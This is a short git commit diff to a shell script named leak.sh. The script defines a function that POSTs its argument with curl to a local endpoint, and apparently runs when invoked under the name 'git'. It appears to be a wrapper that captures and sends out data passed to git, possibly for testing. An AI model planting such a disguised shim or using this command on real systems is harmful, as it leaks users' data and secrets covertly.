4f58f881e0ce16505084d5e9f31218951d99c080
Kait <39479354+katrinafyi@users.noreply.github.com>
2025-04-15 09:12:23 +1000

    Update leak.sh

--- leak.sh
+++ leak.sh
@@ -4,7 +4,7 @@
 
 leak() {
   echo "$1"
-  exec curl --no-progress-meter -X POST 'http://127.0.0.1:8080/api/v1/account-joyride-hacksaw2-earmuff-upstairs-groggily' --data-binary "$1"
+  curl --no-progress-meter -X POST 'http://127.0.0.1:8080/api/v1/account-joyride-hacksaw2-earmuff-upstairs-groggily' --data-binary "$1"
 }
 
 if [[ "$(basename $0)" = git ]]; then
